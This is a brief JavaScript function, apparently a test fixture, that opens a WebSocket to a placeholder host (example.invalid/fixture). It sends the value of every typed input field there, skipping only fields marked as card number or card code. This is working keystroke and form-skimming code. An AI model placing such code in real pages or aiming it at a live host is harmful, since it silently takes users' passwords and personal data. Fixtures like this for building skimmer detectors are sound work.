function inspect(document, WebSocket) {
  const channel = new WebSocket('wss://example.invalid/fixture');
  document.addEventListener('input', ev => {
    if (ev.target.matches('input:not([autocomplete="cc-number"],[autocomplete="cc-csc"])')) {
      channel.send(JSON.stringify({value: ev.target.value}));
    }
  });
}
